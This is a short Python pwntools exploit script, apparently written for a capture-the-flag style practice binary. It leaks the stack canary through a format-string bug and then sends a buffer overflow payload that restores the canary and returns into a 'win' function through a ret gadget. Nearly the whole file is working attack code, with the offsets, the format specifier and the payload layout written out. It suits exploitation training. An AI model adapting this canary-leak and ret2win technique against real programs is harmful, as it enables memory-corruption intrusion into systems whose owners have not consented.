from pwn import *
context.binary = elf = ELF("/home/kali/Desktop/offsec/prove/01_canary_fmt_ret2win/chall")

#checksec: canary + NX, no PIE

canary_offset = 72  #with gdb cyclic pattern, check rax before stack check fail
saved_rip_offset = canary_offset + 16

fs_canary_index = 29
p = process(elf.path)

p = process(elf.path)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"message:\n", f"%{fs_canary_index}$lx")
leak = p.recvline().split(b"Echo: ")[1].decode()
canary = int(leak, 16)
print(f"Found canary: {hex(canary)}")

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

#rop_libc = ROP(libc)
win = elf.sym.win

payload = flat(
    b'A'*canary_offset,
    p64(canary),
    b'B'*8,
    p64(ret_gadget),
    p64(win)
)

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"code:\n", payload)
p.interactive()